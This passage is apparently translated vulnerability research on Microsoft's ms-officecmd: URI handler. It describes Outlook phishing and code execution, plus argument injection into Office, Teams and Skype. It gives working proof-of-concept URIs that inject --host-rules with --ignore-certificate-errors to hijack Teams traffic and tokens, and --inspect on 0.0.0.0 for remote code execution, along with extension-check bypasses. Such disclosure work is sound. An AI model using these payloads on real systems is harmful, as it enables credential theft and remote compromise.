  * `appId`: 要打开的办公桌面应用程序
  * `filename`: 要在指定应用程序中打开的文件路径或URL
`name` 和 `command`属性被验证并以较低的优先级处理，而`id`属性似乎只用于遥测。
在一个安装了基本Office的设备上, 我们列举了以下 `appId` 映射:
  * `1`: Access
  * `2`: Excel
  * `5`: Teams
  * `6`: Skype for Business
  * `7`: OneDrive
  * `8`: Outlook
  * `10`: PowerPoint
  * `12`: Publisher
  * `14`: Word
  * `18`: OneNote
  * `21`: Skype
### Outlook 网络钓鱼问题
第一个值得注意的发现是，当在文件名属性中提供一个`http (s)` URL 时，Outlook 会在一个基于 ie11的嵌入式 webview
中呈现相应的网页，但没有说明该网页的来源，甚至没有说明所显示的内容来自外部网页。这种行为可以被用来发起迷惑度极高的网络钓鱼攻击，特别是因为
`mailto:`链接可以根据本地配置，可以打开用户的电子邮件程序:
Outlook窗口内显示的登录界面是攻击者控制的网页
### Outlook 代码执行问题
Outlook 的意外打开行为可能被滥用，以通过更多的用户交互来实现代码执行。虽然 Outlook
不允许使用‘`file://`url，但允许使用`c://` url
方案，后来将其视为本地路径的驱动器号。此外，我们还添加了尾随的`/`，它绕过了`AppBridge.dll`中的文件扩展检查，但在以后打开可执行文件时被忽略。
这个 PoC 要求用户确认一个额外的警告对话框，但是我们认为，在这个情境下，哪怕聪明的用户也会被误导，从而点击确定:
使用`ms-officecmd:`和 Outlook 进行用户交互的 RCE 攻击
以下是恶意网页链接被点击后的情况:
  1. 通过动态添加一个指向 exe(demo中一个重命名为`PuTTY`的可执行文件) 的 iframe，一个名为`outlook.exe`的恶意可执行文件被保存到受害者的下载文件夹
  2. 看似无害的`mailto:`link 目标被一个恶意的`ms-officecmd:`URI 替换，该 URI 引用其`filename`属性中下载的可执行文件(注意左下角的悬停链接预览)
  3. 用户确认`打开 LocalBridge?`对话框(没有明确的安全警告)
  4. 当 Outlook 启动时，它会显示一个关于打开可能不安全的超链接的警告对话框。用户确认打开了本地的 outlook.exe 文件。
  5. 执行下载的文件(弹出 PuTTY 窗口)
### `filename` 属性参数注入
上面显示的问题滥用了`filename`属性，它提供的值在 Outlook 应用程序的上下文中是不常用和处理不当的，但是在更抽象的`ms-officecmd:`URI 处理程序上下文中可能是完全有效的和符合预期的: 除了具有大量不同文件扩展名的本地文件路径之外，大多数 Office
应用程序允许通过 `http`url 直接打开托管在 web 上的文档，就像 SharePoint/OneDrive 中的文件一样。
我们的接着发现，通过攻击 URI
处理程序本身处理`filename`属性的方式可以进一步推进滥用的可能性。即使不完全了解`AppBridge.dll`的内部工作原理，也有一定信心假设，为了使用指定的参数打开指定的
Office 应用程序，URI 处理程序最终要么生成并执行 shell
命令，要么直接运行其可执行程序。无论如何，攻击者控制的`filename`属性需要作为 shell
命令的一部分或参数传递。当我们使用常见的命令和参数注入技术进行实验时，我们发现可以使用一个简单的"`"` `` "(双引号 + 空格)序列来打破文件名规范。
这个参数注入说明了核心的最重要的问题。在我们进入实际的开发之前，这里有一个视频展示了最基本的参数注入:
使用`filename`参数注入来注入`/q`开关:
注意，当打开第二个 URI 时，没有蓝色 splash (加载)屏幕
这是视频中使用的URI（需要转义引号才能不破坏JSON）：
    ms-officecmd:{
       "LocalProviders.LaunchOfficeAppForResult": {
           "details": {
               "appId": 14,
               "name": "Word",
               "discovered": {
                   "command": "irrelevant"
               }
           },
           "filename": "https://example.com/\" /q"
       }
    }
### 加载恶意Word/Excel加载项
在发现可以将参数注入Office应用程序的启动命令之后，我们的下一步自然是检查哪些类型的参数对我们可用。因为我们有[针对Microsoft
Office产品的有文档记录的命令行开关](https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6)，与启动时加载外接程序有关的那些似乎最有可能使用。
我们尝试了以下外接程序类型：
  * `.dll` 和 `.wll` 文件
  * `VSTO` 插件
  * 'Office' (web) 插件
不幸的是，我们无法让应用程序在启动时正确加载我们制作的任何加载项。
试图使用`-l`开关加载 Word 外接程序失败
### Teams MITM, 使用`--host-rules`身份验证泄漏
虽然我们对以文档为中心的Office应用程序进行的参数注入实验没有产生任何现实世界的攻击者会感兴趣的发现，但还有另一组应用程序可以去研究：Microsoft
Teams 和 Skype基于Electron框架，因此配备了大量有用的[Electron
命令行参数](https://www.electronjs.org/docs/api/command-line-switches)和[Node.js命令行参数](https://nodejs.org/api/cli.html).
我们能够确认的第一个可能被滥用的参数是`--host-rules`。此参数可用于重新映射IP地址和主机名，从而将应用程序的所有相关网络流量定向到所选目标。使用新域作为映射目标时，只要为新域正确设置了TLS，就不会出现TLS错误。通过添加`--ignore
certificate errors`开关，甚至那个操作都可以省去。借助反向代理，甚至仅仅是侦听web服务器，攻击者可以提取发送到Microsoft
Teams后端服务的所有敏感信息，包括身份验证令牌和消息。还可以利用反向代理修改API响应，并向受害者模拟任何MS Team用户。
当我们试图设计一个有效载荷以注入这些参数时，我们必须克服另外两个障碍：
  1. 作为[关键CVE-2018-1000006的修复](https://www.electronjs.org/blog/protocol-handler-fix)，Electron更改了他们的命令行解析逻辑，以在URI之后删除其他参数。通过检查源代码，我们发现了一个[单字母URI方案的例外情况](https://github.com/electron/electron/blob/4b70ccde26c057a3376c52eb563431943ebc3be6/shell/app/command_line_args.cc#L18-L2)，它跳过对包含驱动器号的Windows文件路径（即`C:/`）的过滤。因此我们可以在伪`filename`前缀后面插入Electron参数，比如`a:/b/`，这适用于Electron和`AppBridge.dll`。
  2. MS团队有时会因为`AppBridge.dll`文件扩展名检查而不会为包含`.`（句点）的`filename`参数启动。在下面的视频中，通过转换目标IP地址`3.64.176.207`转换为其整数格式`54571215`绕过此检查。
使用注入的`--host rules`和`--ignore certificate errors`参数将MS团队https流量重定向到我们自己的服务器
请注意，在此演示视频中，请求未转发到Team的真实后端，导致连接错误。 这是视频中使用的URI：
    ms-officecmd:{
       "LocalProviders.LaunchOfficeAppForResult": {
           "details": {
               "appId": 5,
               "name": "irrelevant",
               "discovered": {
                   "command": "teams.exe",
                   "uri": "msteams"
               }
           },
           "filename": "a:/b/ --ignore-certificate-errors --host-rules=\"MAP * 54571215\""
       }
    }
### 使用`--inspect` 调试器从本地网络执行Teams/Skype代码
另一个有用的参数是Node.js`--inspect`参数，可用于调试Node.JSJavaScript环境。该参数指定了可用于连接调试器的网络接口和端口号。出于安全原因，只能通过本地默认接口`127.0.0.1`进行调试。在下面的视频中，我们通过`---inspect=“0.0.0.0:28966”`开关覆盖该设置，以便在端口28966上接受任何网络接口的调试器连接。一旦调试器被连接，我们就利用一个标准Node.js库来执行我们的命令：`require（“child_进程”）.exec（“”）`
再次制作有效负载需要一些技巧：
  1. 考虑到Skype打开时处理`filename`参数的方式，因此在插入其他参数之前，需要在假文件名之后再添加一个`"`字符。
  2. 在指定侦听接口时，不接受IP地址整数格式，我们就不得不包含字符`.`。因此，这一次，我们通过在恶意的`filename`负载末尾添加字符`/`，绕过`AppBridge.dll`中的文件扩展名检查。
本地网络攻击通过单击VM内部的恶意链接来显示，并从主机系统将调试器连接到Skype进程。
这是视频中使用的URI：
    ms-officecmd:{
       "LocalProviders.LaunchOfficeAppForResult": {
           "details": {
               "appId": 21,
               "name": "irrelevant",
               "discovered": {
                   "command": "irrelevant"
               }
           },
           "filename": "a:/b/\" --inspect=\"0.0.0.0:28966\" /"
       }
    }
请注意，对于易受影响的设置，此攻击还可能与[DNS重新绑定](https://en.wikipedia.org/wiki/DNS_rebinding)等结合使用，或与（最近改进的）[NATSlipstreaming](https://github.com/samyk/slipstream)技术一起使用，从而借助浏览器实现RCE的技术，无需本地网络访问。
### Teams 借助`--inspect` 调试器和带有SOP 旁路MITM 执行代码